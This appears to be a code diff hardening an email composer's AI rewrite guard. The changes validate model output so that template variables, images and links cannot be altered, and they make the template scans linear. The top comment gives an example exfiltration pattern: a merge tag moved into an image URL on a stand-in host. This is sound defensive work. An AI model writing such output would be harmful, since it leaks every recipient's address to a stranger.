@@ -1,6 +1,6 @@
 /**
  * AI on the draft: what the composer's rewrite actions are, and the guard that keeps a rewrite from
- * breaking the template.
+ * breaking the template or reaching outside the draft.
  *
  * A draft carries syntax the renderer fills in per lead: `{{firstName|there}}`, `{{ai.icebreaker}}`,
  * spintax `{Hi|Hello}`, `{{#if title}}...{{/if}}` blocks, and images (sometimes a large inline data
@@ -11,14 +11,20 @@
  *  1. `protectTokens` replaces each one by a numbered placeholder (`[[T1]]`, `[[T2]]`, ...). A
  *     conditional block goes whole, its text included: what it says depends on the lead, and a
  *     rewrite cannot know which branch a reader sees.
- *  2. `validateRewrite` refuses an answer that dropped, repeated or invented a placeholder, wrote
- *     template syntax of its own, or carries a link the draft did not have; otherwise it puts the
- *     original tokens back exactly as written.
+ *  2. `validateRewrite` strips any image the model wrote (the originals are placeholders, so they
+ *     come back untouched), refuses an answer that dropped, repeated or invented a placeholder or
+ *     wrote template syntax of its own, then reads the links and image addresses from the parsed,
+ *     sanitised result: each must be one the draft already had. A model that moves `{{email}}` into
+ *     `<img src="https://x/?e=...">` or a new link would otherwise send every lead's address to a
+ *     stranger the moment the email is opened.
+ *
+ * Every scan here is linear: the request body is attacker-sized, and the first version spent 5.6 s
+ * on 60 KB of `{a`.
  *
  * Pure, client and server.
  */
 import { isHtml } from '@/lib/email/sanitize';
-import { plainTextToHtml } from './html';
+import { plainTextToHtml, sanitizeComposeDetailed, stripImages } from './html';
 
 export const REWRITE_ACTIONS = [
   { id: 'shorten', label: 'Shorten' },
@@ -38,6 +44,9 @@ export const MAX_REWRITE_INPUT_CHARS = 60_000;
 /** What the model is given once tokens and images are placeholders: about 1,500 words. */
 export const MAX_REWRITE_TEXT_CHARS = 10_000;
 export const MAX_REWRITE_INSTRUCTION_CHARS = 300;
+/** More template syntax or images than any real email has: refused before anything is parsed. */
+export const MAX_REWRITE_BRACES = 2_000;
+export const MAX_REWRITE_IMAGES = 100;
 
 export interface ProtectedText {
   masked: string;
@@ -47,64 +56,106 @@ export interface ProtectedText {
 
 const placeholder = (index: number) => `[[T${index + 1}]]`;
 const PLACEHOLDER_RE = /\[\[T(\d+)\]\]/g;
+const CONDITIONAL_TAG_RE = /\{\{\s{0,20}(#if\b[^}]{0,300}|\/if\s{0,20})\}\}/g;
+const CONDITIONAL_OPEN_RE = /^\{\{\s{0,20}#if\b/;
 
-/** End of the `{{...}}` tag starting at `i` (index after `}}`), or -1 when it never closes. */
-function tagEnd(text: string, i: number): number {
-  const close = text.indexOf('}}', i + 2);
-  return close === -1 ? -1 : close + 2;
+/** A cheap count, run before any scanning: why this draft cannot be rewritten, or null. */
+export function rewriteInputProblem(text: string): string | null {
+  let braces = 0;
+  for (let i = 0; i < text.length; i++) if (text.charCodeAt(i) === 123 /* { */) braces++;
+  if (braces > MAX_REWRITE_BRACES) return 'This draft has more template syntax than can be rewritten safely. Rewrite it in parts.';
+  if ((text.match(/<img\b/gi) ?? []).length > MAX_REWRITE_IMAGES) return 'This draft has too many images to rewrite.';
+  return null;
 }
 
-/** End of the `{{#if}}` block starting at `i`, following nested blocks, or -1 when it never closes. */
-function conditionalEnd(text: string, i: number): number {
-  const re = /\{\{\s*(#if\b[^}]*|\/if\s*)\}\}/g;
-  re.lastIndex = i;
-  let depth = 0;
-  for (let m = re.exec(text); m; m = re.exec(text)) {
-    depth += m[1].startsWith('#') ? 1 : -1;
-    if (depth === 0) return m.index + m[0].length;
-  }
-  return -1;
+interface TemplateScan {
+  /** End of the `{{...}}` tag at `i` (index after `}}`), or -1 when it never closes. */
+  tagEnd(i: number): number;
+  /** End of the `{{#if}}` block at `i`, nested blocks followed, or -1 when it never closes. */
+  conditionalEnd(i: number): number;
+  /** End of the spintax group at `i` (a `{` with a `|` at its own level), or -1. */
+  spintaxEnd(i: number): number;
 }
 
 /**
- * End of the spintax group starting at `i` (a single `{` with a `|` at its own level), or -1 when
- * the brace is ordinary text. `{{...}}` inside it is skipped whole.
+ * Everything the tokenizer asks about, computed in single passes up front. Asking "where does this
+ * close" again from every brace is what made the first version quadratic.
  */
-function spintaxEnd(text: string, i: number): number {
-  let depth = 0;
-  let hasOption = false;
-  for (let j = i; j < text.length; j++) {
-    if (text[j] === '{' && text[j + 1] === '{') {
-      const next = tagEnd(text, j);
-      if (next === -1) return -1;
-      j = next - 1;
-    } else if (text[j] === '{') depth++;
-    else if (text[j] === '}') {
-      depth--;
-      if (depth === 0) return hasOption ? j + 1 : -1;
-    } else if (text[j] === '|' && depth === 1) hasOption = true;
+function scanTemplate(text: string): TemplateScan {
+  const n = text.length;
+  const nextClose = new Int32Array(n + 2).fill(-1);
+  for (let i = n - 2; i >= 0; i--) nextClose[i] = text[i] === '}' && text[i + 1] === '}' ? i : nextClose[i + 1];
+  const tagEnd = (i: number) => {
+    const close = i + 2 <= n ? nextClose[i + 2] : -1;
+    return close === -1 ? -1 : close + 2;
+  };
+
+  const conditionals = new Map<number, number>();
+  const opens: number[] = [];
+  for (const m of text.matchAll(CONDITIONAL_TAG_RE)) {
+    if (m[1].startsWith('#')) opens.push(m.index);
+    else if (opens.length > 0) conditionals.set(opens.pop()!, m.index + m[0].length);
+  }
+
+  const spintax = new Map<number, number>();
+  const groups: Array<{ at: number; options: boolean }> = [];
+  for (let j = 0; j < n; j++) {
+    const ch = text[j];
+    if (ch === '{' && text[j + 1] === '{') {
+      const end = tagEnd(j);
+      // A `{{` that never closes cannot sit inside a group, and the groups open around it never close.
+      if (end === -1) { groups.length = 0; continue; }
+      j = end - 1;
+    } else if (ch === '{') groups.push({ at: j, options: false });
+    else if (ch === '}') {
+      const group = groups.pop();
+      if (group?.options) spintax.set(group.at, j + 1);
+    } else if (ch === '|' && groups.length > 0) groups[groups.length - 1].options = true;
+  }
+
+  return {
+    tagEnd,
+    conditionalEnd: (i) => conditionals.get(i) ?? -1,
+    spintaxEnd: (i) => spintax.get(i) ?? -1,
+  };
+}
+
+/**
+ * End of the `<img ...>` tag at `i`, or -1. A `>` inside a quoted attribute (`alt="a>b"`) does not
+ * end it. The scan stops at the next `<`, which a serialised attribute never contains unescaped, so
+ * scans from successive `<img` never overlap and the whole pass stays linear.
+ */
+function imageEnd(text: string, i: number): number {
+  let quote: string | null = null;
+  for (let j = i + 4; j < text.length; j++) {
+    const ch = text[j];
+    if (ch === '<') return -1;
+    if (quote) { if (ch === quote) quote = null; continue; }
+    if (ch === '"' || ch === "'") quote = ch;
+    else if (ch === '>') return j + 1;
   }
   return -1;
 }
 
 /** The length of the token that starts at `i`, or 0 when ordinary text starts there. */
-function tokenAt(text: string, i: number): number {
-  const rest = text.slice(i, i + 8);
-  if (/^<img\b/i.test(rest)) {
-    const close = text.indexOf('>', i);
-    return close === -1 ? 0 : close + 1 - i;
+function tokenAt(text: string, i: number, scan: TemplateScan): number {
+  const ch = text[i];
+  if (ch === '<') {
+    if (!/^<img\b/i.test(text.slice(i, i + 5))) return 0;
+    const end = imageEnd(text, i);
+    return end === -1 ? 0 : end - i;
   }
-  if (rest.startsWith('[[T')) {
-    const m = /^\[\[T\d+\]\]/.exec(text.slice(i, i + 16));
+  if (ch === '[') {
+    const m = /^\[\[T\d{1,6}\]\]/.exec(text.slice(i, i + 12));
     return m ? m[0].length : 0;
   }
-  if (rest.startsWith('{{')) {
-    const end = /^\{\{\s*#if\b/.test(text.slice(i, i + 12)) ? conditionalEnd(text, i) : -1;
-    const whole = end !== -1 ? end : tagEnd(text, i);
-    return whole === -1 ? 0 : whole - i;
+  if (ch === '{' && text[i + 1] === '{') {
+    const block = CONDITIONAL_OPEN_RE.test(text.slice(i, i + 30)) ? scan.conditionalEnd(i) : -1;
+    const end = block !== -1 ? block : scan.tagEnd(i);
+    return end === -1 ? 0 : end - i;
   }
-  if (rest.startsWith('{')) {
-    const end = spintaxEnd(text, i);
+  if (ch === '{') {
+    const end = scan.spintaxEnd(i);
     return end === -1 ? 0 : end - i;
   }
   return 0;
@@ -112,25 +163,29 @@ function tokenAt(text: string, i: number): number {
 
 /** Replace every template token, image and placeholder-shaped text with a numbered placeholder. */
 export function protectTokens(text: string): ProtectedText {
+  const scan = scanTemplate(text);
   const tokens: string[] = [];
-  let masked = '';
+  const parts: string[] = [];
+  let plainFrom = 0;
   let i = 0;
   while (i < text.length) {
     const ch = text[i];
-    const length = ch === '<' || ch === '{' || ch === '[' ? tokenAt(text, i) : 0;
+    const length = ch === '<' || ch === '{' || ch === '[' ? tokenAt(text, i, scan) : 0;
     if (length > 0) {
-      masked += placeholder(tokens.length);
+      parts.push(text.slice(plainFrom, i), placeholder(tokens.length));
       tokens.push(text.slice(i, i + length));
       i += length;
+      plainFrom = i;
     } else {
-      masked += ch;
       i++;
     }
   }
-  return { masked, tokens };
+  parts.push(text.slice(plainFrom));
+  return { masked: parts.join(''), tokens };
 }
 
-export type RewriteRefusal = 'dropped' | 'duplicated' | 'invented' | 'added_syntax' | 'link_changed' | 'variables_changed';
+export type RewriteRefusal =
+  | 'dropped' | 'duplicated' | 'invented' | 'added_syntax' | 'link_changed' | 'token_in_link' | 'images_changed' | 'variables_changed';
 export type RestoreResult = { ok: true; text: string } | { ok: false; reason: RewriteRefusal; message: string };
 
 const braces = (text: string) => (text.match(/[{}]/g) ?? []).length;
@@ -171,45 +226,79 @@ export function restoreTokens(output: string, original: ProtectedText): RestoreR
   return { ok: true, text: output.replace(PLACEHOLDER_RE, (_whole, n: string) => original.tokens[Number(n) - 1]) };
 }
 
-function hrefs(html: string): string[] {
-  return [...html.matchAll(/<a\b[^>]*?\bhref\s*=\s*["']([^"']*)["']/gi)].map((m) => m[1].trim());
+/** Template syntax, or a placeholder, inside an address: how a lead's data would leave in a URL. */
+const ADDRESS_TOKEN = /\{\{|\[\[T\d|\{[^{}]{0,300}\|/;
+const LINK_CHANGED: RestoreResult = { ok: false, reason: 'link_changed', message: 'The rewrite added or changed a link or image address, so it was not used. Try again.' };
+const TOKEN_IN_LINK: RestoreResult = {
+  ok: false, reason: 'token_in_link',
+  message: 'The rewrite put one of your variables inside a link or image address, so it was not used. Try again.',
+};
+
+/** The first address in `found` the draft did not have, judged as a refusal; null when all are known. */
+function unknownAddress(found: string[], known: Set<string>): RestoreResult | null {
+  const unknown = found.find((address) => !known.has(address));
+  if (unknown === undefined) return null;
+  return ADDRESS_TOKEN.test(unknown) ? TOKEN_IN_LINK : LINK_CHANGED;
+}
+
+const TRAILING_PUNCTUATION = '.,;:!?)]}\'"';
+
+/** Web addresses written as text, trailing punctuation off. */
+function bareUrls(text: string): string[] {
+  return (text.match(/\b(?:https?:\/\/|www\.)[^\s<>"']+/gi) ?? []).map((url) => {
+    let end = url.length;
+    while (end > 0 && TRAILING_PUNCTUATION.includes(url[end - 1])) end--;
+    return url.slice(0, end);
+  });
 }
 
 /**
- * The checks a rewrite passes before the rep sees it: tokens intact (see `restoreTokens`), and no
- * link the draft did not already have. Dropping a link is allowed (a shorter email may lose one);
- * adding or changing one is not, since a model could otherwise route a prospect anywhere.
+ * The checks a rewrite passes before the rep sees it. For an HTML draft the text returned is the
+ * sanitised HTML whose links were inspected, so nothing can change between the check and the use.
+ * Dropping a link is allowed (a shorter email may lose one); adding or changing one is not.
  */
-export function validateRewrite(input: string, original: ProtectedText, output: string): RestoreResult {
-  const restored = restoreTokens(output, original);
-  if (!restored.ok) return restored;
-  const allowed = new Set(hrefs(input));
-  if (hrefs(restored.text).some((href) => !allowed.has(href))) {
-    return { ok: false, reason: 'link_changed', message: 'The rewrite added or changed a link, so it was not used. Try again.' };
+export function validateRewrite(input: string, original: ProtectedText, output: string, draftIsHtml = isHtml(input)): RestoreResult {
+  if (!draftIsHtml) {
+    const restored = restoreTokens(output, original);
+    if (!restored.ok) return restored;
+    return unknownAddress(bareUrls(restored.text), new Set(bareUrls(input))) ?? restored;
   }
-  return restored;
+
+  // Any image in the answer is the model's own: the draft's images are placeholders until now.
+  const restored = restoreTokens(stripImages(output), original);
+  if (!restored.ok) return restored;
+  const result = sanitizeComposeDetailed(restored.text);
+  const draft = sanitizeComposeDetailed(input);
+  const refused =
+    unknownAddress(result.hrefs, new Set(draft.hrefs)) ??
+    unknownAddress(result.srcs, new Set(draft.srcs)) ??
+    unknownAddress(bareUrls(result.html.replace(/<[^<>]{0,4000}>/g, ' ')), new Set([...draft.hrefs, ...bareUrls(input)]));
+  if (refused) return refused;
+  if (result.images !== draft.images) {
+    return { ok: false, reason: 'images_changed', message: 'The rewrite lost or changed an image in your draft, so it was not used. Try again.' };
+  }
+  return { ok: true, text: result.html };
 }
 
 /** Every merge tag, conditional tag and spintax group in `text`, as written: what must survive a rewrite. */
 export function templateTokens(text: string): string[] {
+  const scan = scanTemplate(text);
   const out: string[] = [];
-  const walk = (s: string) => {
-    for (let i = 0; i < s.length; i++) {
-      if (s[i] === '{' && s[i + 1] === '{') {
-        const end = tagEnd(s, i);
-        if (end === -1) return;
-        out.push(s.slice(i, end));
+  for (let i = 0; i < text.length; i++) {
+    if (text[i] !== '{') continue;
+    if (text[i + 1] === '{') {
+      const end = scan.tagEnd(i);
+      if (end === -1) break;
+      out.push(text.slice(i, end));
+      i = end - 1;
+    } else {
+      const end = scan.spintaxEnd(i);
+      if (end !== -1) {
+        out.push(text.slice(i, end));
         i = end - 1;
-      } else if (s[i] === '{') {
-        const end = spintaxEnd(s, i);
-        if (end !== -1) {
-          out.push(s.slice(i, end));
-          i = end - 1;
-        }
       }
     }
-  };
-  walk(text);
+  }
   return out;
 }
 
@@ -224,5 +313,5 @@ export function sameTemplateTokens(a: string, b: string): boolean {
 export function insertBelow(body: string, addition: string): string {
   if (!body.trim()) return addition;
   if (isHtml(body)) return `${body}${isHtml(addition) ? addition : plainTextToHtml(addition)}`;
-  return `${body.replace(/\s+$/, '')}\n\n${addition}`;
+  return `${body.trimEnd()}\n\n${addition}`;
 }
